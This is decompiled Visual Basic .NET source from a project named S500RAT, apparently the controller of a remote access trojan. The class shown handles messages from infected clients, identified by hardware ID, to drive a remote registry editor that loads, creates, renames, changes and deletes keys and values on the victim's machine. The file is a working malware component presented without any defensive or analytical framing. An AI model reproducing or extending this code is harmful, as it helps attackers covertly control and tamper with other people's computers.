Imports System
Imports System.IO
Imports System.Windows.Forms
Imports Gry.Helper
Imports MessagePackLib.MessagePack
Imports Microsoft.VisualBasic.CompilerServices
Imports Microsoft.Win32
Imports ProtoBuf
Imports S500RAT.Server.Connection

Namespace S500RAT
	' Token: 0x0200005A RID: 90
	Public Class FrmRegistery
		' Token: 0x060011AF RID: 4527 RVA: 0x0009CC44 File Offset: 0x0009AE44
		Public Sub AddArrary(client As Clients, unpack_msgpack As MsgPack)
			Try
				Dim asString As String = unpack_msgpack.ForcePathObject("Command").AsString
				Dim num As UInteger = <PrivateImplementationDetails>.ComputeStringHash(asString)
				If num <= 2436850624UI Then
					If num <= 836757040UI Then
						If num <> 564773235UI Then
							If num = 836757040UI Then
								If Operators.CompareString(asString, "RenameValue", False) = 0 Then
									Dim formRegistryE As FormRegistryE = CType(Application.OpenForms("FrmRegistryEditor" + unpack_msgpack.ForcePathObject("Hwid").AsString), FormRegistryE)
									Dim flag As Boolean = formRegistryE IsNot Nothing
									If flag Then
										Dim asString2 As String = unpack_msgpack.ForcePathObject("keyPath").AsString
										Dim asString3 As String = unpack_msgpack.ForcePathObject("OldValueName").AsString
										Dim asString4 As String = unpack_msgpack.ForcePathObject("NewValueName").AsString
										formRegistryE.RenameValue(asString2, asString3, asString4)
									End If
								End If
							End If
						ElseIf Operators.CompareString(asString, "DeleteValue", False) = 0 Then
							Dim formRegistryE2 As FormRegistryE = CType(Application.OpenForms("FrmRegistryEditor" + unpack_msgpack.ForcePathObject("Hwid").AsString), FormRegistryE)
							Dim flag2 As Boolean = formRegistryE2 IsNot Nothing
							If flag2 Then
								Dim asString5 As String = unpack_msgpack.ForcePathObject("keyPath").AsString
								Dim asString6 As String = unpack_msgpack.ForcePathObject("ValueName").AsString
								formRegistryE2.DeleteValue(asString5, asString6)
							End If
						End If
					ElseIf num <> 2082903604UI Then
						If num = 2436850624UI Then
							If Operators.CompareString(asString, "LoadKey", False) = 0 Then
								Dim formRegistryE3 As FormRegistryE = CType(Application.OpenForms("FrmRegistryEditor" + unpack_msgpack.ForcePathObject("Hwid").AsString), FormRegistryE)
								Dim flag3 As Boolean = formRegistryE3 IsNot Nothing
								If flag3 Then
									Dim asString7 As String = unpack_msgpack.ForcePathObject("RootKey").AsString
									Dim asBytes As Byte() = unpack_msgpack.ForcePathObject("Matches").GetAsBytes()
									formRegistryE3.AddKeys(asString7, FrmRegistery.DeSerializeMatches(asBytes))
								End If
							End If
						End If
					ElseIf Operators.CompareString(asString, "setClient", False) = 0 Then
						Dim formRegistryE4 As FormRegistryE = CType(Application.OpenForms("FrmRegistryEditor" + unpack_msgpack.ForcePathObject("Hwid").AsString), FormRegistryE)
						Dim flag4 As Boolean = formRegistryE4 IsNot Nothing
						If flag4 Then
							Dim flag5 As Boolean = formRegistryE4.Client Is Nothing
							If flag5 Then
								client.ID = unpack_msgpack.ForcePathObject("Hwid").AsString
								formRegistryE4.Client = client
								formRegistryE4.timer1.Enabled = True
							End If
						End If
					End If
				ElseIf num <= 2907803874UI Then
					If num <> 2750843969UI Then
						If num = 2907803874UI Then
							If Operators.CompareString(asString, "CreateValue", False) = 0 Then
								Dim formRegistryE5 As FormRegistryE = CType(Application.OpenForms("FrmRegistryEditor" + unpack_msgpack.ForcePathObject("Hwid").AsString), FormRegistryE)
								Dim flag6 As Boolean = formRegistryE5 IsNot Nothing
								If flag6 Then
									Dim asString8 As String = unpack_msgpack.ForcePathObject("keyPath").AsString
									Dim asString9 As String = unpack_msgpack.ForcePathObject("Kindstring").AsString
									Dim asString10 As String = unpack_msgpack.ForcePathObject("newKeyName").AsString
									Dim kind As RegistryValueKind = RegistryValueKind.None
									num = <PrivateImplementationDetails>.ComputeStringHash(asString9)
									If num <= 839689206UI Then
										If num <= 485174231UI Then
											If num <> 348981803UI Then
												If num = 485174231UI Then
													If Operators.CompareString(asString9, "11", False) = 0 Then
														kind = RegistryValueKind.QWord
													End If
												End If
											ElseIf Operators.CompareString(asString9, "-1", False) = 0 Then
												kind = RegistryValueKind.None
											End If
										ElseIf num <> 822911587UI Then
											If num = 839689206UI Then
												If Operators.CompareString(asString9, "7", False) = 0 Then
													kind = RegistryValueKind.MultiString
												End If
											End If
										ElseIf Operators.CompareString(asString9, "4", False) = 0 Then
											kind = RegistryValueKind.DWord
										End If
									ElseIf num <= 890022063UI Then
										If num <> 873244444UI Then
											If num = 890022063UI Then
												If Operators.CompareString(asString9, "0", False) = 0 Then
													kind = RegistryValueKind.Unknown
												End If
											End If
										ElseIf Operators.CompareString(asString9, "1", False) = 0 Then
											kind = RegistryValueKind.[String]
										End If
									ElseIf num <> 906799682UI Then
										If num = 923577301UI Then
											If Operators.CompareString(asString9, "2", False) = 0 Then
												kind = RegistryValueKind.ExpandString
											End If
										End If
									ElseIf Operators.CompareString(asString9, "3", False) = 0 Then
										kind = RegistryValueKind.Binary
									End If
									Dim value As RegistrySeeker.RegValueData = New RegistrySeeker.RegValueData() With { .Name = asString10, .Kind = kind, .Data = New Byte(-1) {} }
									formRegistryE5.CreateValue(asString8, value)
								End If
							End If
						End If
					ElseIf Operators.CompareString(asString, "DeleteKey", False) = 0 Then
						Dim formRegistryE6 As FormRegistryE = CType(Application.OpenForms("FrmRegistryEditor" + unpack_msgpack.ForcePathObject("Hwid").AsString), FormRegistryE)
						Dim flag7 As Boolean = formRegistryE6 IsNot Nothing
						If flag7 Then
							Dim asString11 As String = unpack_msgpack.ForcePathObject("ParentPath").AsString
							Dim asString12 As String = unpack_msgpack.ForcePathObject("KeyName").AsString
							formRegistryE6.DeleteKey(asString11, asString12)
						End If
					End If
				ElseIf num <> 3208646218UI Then
					If num <> 3760340948UI Then
						If num = 4124725250UI Then
							If Operators.CompareString(asString, "ChangeValue", False) = 0 Then
								Dim formRegistryE7 As FormRegistryE = CType(Application.OpenForms("FrmRegistryEditor" + unpack_msgpack.ForcePathObject("Hwid").AsString), FormRegistryE)
								Dim flag8 As Boolean = formRegistryE7 IsNot Nothing
								If flag8 Then
									Dim asString13 As String = unpack_msgpack.ForcePathObject("keyPath").AsString
									Dim asBytes2 As Byte() = unpack_msgpack.ForcePathObject("Value").GetAsBytes()
									formRegistryE7.ChangeValue(asString13, FrmRegistery.DeSerializeRegValueData(asBytes2))
								End If
							End If
						End If
					ElseIf Operators.CompareString(asString, "CreateKey", False) = 0 Then
						Dim formRegistryE8 As FormRegistryE = CType(Application.OpenForms("FrmRegistryEditor" + unpack_msgpack.ForcePathObject("Hwid").AsString), FormRegistryE)
						Dim flag9 As Boolean = formRegistryE8 IsNot Nothing
						If flag9 Then
							Dim asString14 As String = unpack_msgpack.ForcePathObject("ParentPath").AsString
							Dim asBytes3 As Byte() = unpack_msgpack.ForcePathObject("Match").GetAsBytes()
							formRegistryE8.CreateNewKey(asString14, FrmRegistery.DeSerializeMatch(asBytes3))
						End If
					End If
				ElseIf Operators.CompareString(asString, "RenameKey", False) = 0 Then
					Dim formRegistryE9 As FormRegistryE = CType(Application.OpenForms("FrmRegistryEditor" + unpack_msgpack.ForcePathObject("Hwid").AsString), FormRegistryE)
					Dim flag10 As Boolean = formRegistryE9 IsNot Nothing
					If flag10 Then
						Dim asString15 As String = unpack_msgpack.ForcePathObject("rootKey").AsString
						Dim asString16 As String = unpack_msgpack.ForcePathObject("oldName").AsString
						Dim asString17 As String = unpack_msgpack.ForcePathObject("newName").AsString
						formRegistryE9.RenameKey(asString15, asString16, asString17)
					End If
				End If
			Catch ex As Exception
				ListLogs.AddArray("Registry Editor " + client.IP + " Error : " + ex.Message, 0)
			End Try
		End Sub

		' Token: 0x060011B0 RID: 4528 RVA: 0x0009D3B8 File Offset: 0x0009B5B8
		Public Shared Function DeSerializeMatches(bytes As Byte()) As RegistrySeeker.RegSeekerMatch()
			Dim result As RegistrySeeker.RegSeekerMatch()
			Using memoryStream As MemoryStream = New MemoryStream(bytes)
				Dim array As RegistrySeeker.RegSeekerMatch() = Serializer.Deserialize(Of RegistrySeeker.RegSeekerMatch())(memoryStream)
				result = array
			End Using
			Return result
		End Function

		' Token: 0x060011B1 RID: 4529 RVA: 0x0009D3F8 File Offset: 0x0009B5F8
		Public Shared Function DeSerializeMatch(bytes As Byte()) As RegistrySeeker.RegSeekerMatch
			Dim result As RegistrySeeker.RegSeekerMatch
			Using memoryStream As MemoryStream = New MemoryStream(bytes)
				Dim regSeekerMatch As RegistrySeeker.RegSeekerMatch = Serializer.Deserialize(Of RegistrySeeker.RegSeekerMatch)(memoryStream)
				result = regSeekerMatch
			End Using
			Return result
		End Function

		' Token: 0x060011B2 RID: 4530 RVA: 0x0009D438 File Offset: 0x0009B638
		Public Shared Function DeSerializeRegValueData(bytes As Byte()) As RegistrySeeker.RegValueData
			Dim result As RegistrySeeker.RegValueData
			Using memoryStream As MemoryStream = New MemoryStream(bytes)
				Dim regValueData As RegistrySeeker.RegValueData = Serializer.Deserialize(Of RegistrySeeker.RegValueData)(memoryStream)
				result = regValueData
			End Using
			Return result
		End Function
	End Class
End Namespace
